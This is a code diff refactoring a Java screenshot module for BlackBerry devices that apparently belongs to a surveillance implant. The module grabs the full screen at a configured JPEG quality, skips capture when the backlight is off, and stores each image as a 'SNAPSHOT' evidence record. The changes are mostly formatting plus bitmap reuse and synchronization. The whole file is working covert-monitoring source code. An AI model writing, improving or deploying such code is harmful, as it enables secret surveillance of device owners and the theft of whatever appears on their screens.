@@ -17,11 +17,11 @@ import net.rim.device.api.system.JPEGEncodedImage;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.config.ConfModule;
 import blackberry.config.ConfigurationException;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
-import blackberry.debug.Check;
 import blackberry.utils.WChar;
 
 /**
@@ -29,10 +29,12 @@ import blackberry.utils.WChar;
  * 
  * @author user1
  */
-public final class ModuleSnapshot extends BaseInstantModule{
+public final class ModuleSnapshot extends BaseInstantModule {
     //#ifdef DEBUG
     static Debug debug = new Debug("ModSnapshot", DebugLevel.INFORMATION);
     //#endif
+
+    private static Bitmap bitmap;
 
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
     private static final int MIN_TIMER = 1 * 1000;
@@ -51,23 +53,27 @@ public final class ModuleSnapshot extends BaseInstantModule{
     private int type;
     private int quality;
 
+    private int width;
+
+    private int height;
+
     public static String getStaticType() {
         return "snapshot";
     }
-    
+
     /*
      * (non-Javadoc)
      * @see blackberry.agent.Agent#parse(byte[])
      */
-    public boolean parse(ConfModule conf) {       
+    public boolean parse(ConfModule conf) {
         try {
             String qualityParam = conf.getString("quality");
-            if("low".equals(qualityParam)){
-                quality=50;
-            }else if("med".equals(qualityParam)){
-                quality=70;
-            }else if("high".equals(qualityParam)){
-                quality=90;
+            if ("low".equals(qualityParam)) {
+                quality = 50;
+            } else if ("med".equals(qualityParam)) {
+                quality = 70;
+            } else if ("high".equals(qualityParam)) {
+                quality = 90;
             }
         } catch (ConfigurationException e) {
             //#ifdef DEBUG
@@ -77,10 +83,8 @@ public final class ModuleSnapshot extends BaseInstantModule{
             return false;
         }
 
-        
         return true;
     }
-    
 
     // se e' in standby non prendi la snapshot
     /*
@@ -88,48 +92,50 @@ public final class ModuleSnapshot extends BaseInstantModule{
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualStart() {
-    
+
         //#ifdef DEBUG
         debug.trace("snapshot");
         //#endif
-    
+
+        if (bitmap == null) {
+            width = Display.getWidth();
+            height = Display.getHeight();
+            bitmap = new Bitmap(width, height);
+        }
+
         if (!Backlight.isEnabled()) {
             //#ifdef DEBUG
             debug.trace("No backlight, skipping snapshot");
             //#endif
             return;
         }
-    
-        final Bitmap bitmap = getScreenshot();
-    
+
+        getScreenshot();
+
         //#ifdef DEBUG
         debug.info("Taking screenshot");
         //#endif
-    
-        // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
-        final EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
-                quality);
-    
-        final byte[] plain = encoded.getData();
-    
+
+        EncodedImage encoded;
+        synchronized (this) {
+            encoded = JPEGEncodedImage.encode(bitmap, quality);
+        }
+        byte[] plain = encoded.getData();
+        encoded = null;
+
         Evidence evidence = new Evidence(EvidenceType.SNAPSHOT);
-        evidence.atomicWriteOnce(getAdditionalData(),plain);
-    
+        evidence.atomicWriteOnce(getAdditionalData(), plain);
+
         //#ifdef DEBUG
         debug.trace("finished run");
         //#endif
-    
+
     }
 
     /**
      * @return
      */
-    public static Bitmap getScreenshot() {
-        final Bitmap bitmap;
-
-        final int width = Display.getWidth();
-        final int height = Display.getHeight();
-        bitmap = new Bitmap(width, height);
+    public void getScreenshot() {
 
         //#ifdef DEBUG
         debug.trace("portrait: " + Display.getOrientation());
@@ -139,8 +145,6 @@ public final class ModuleSnapshot extends BaseInstantModule{
         //#endif
 
         Display.screenshot(bitmap, 0, 0, width, height);
-
-        return bitmap;
     }
 
     private byte[] getAdditionalData() {
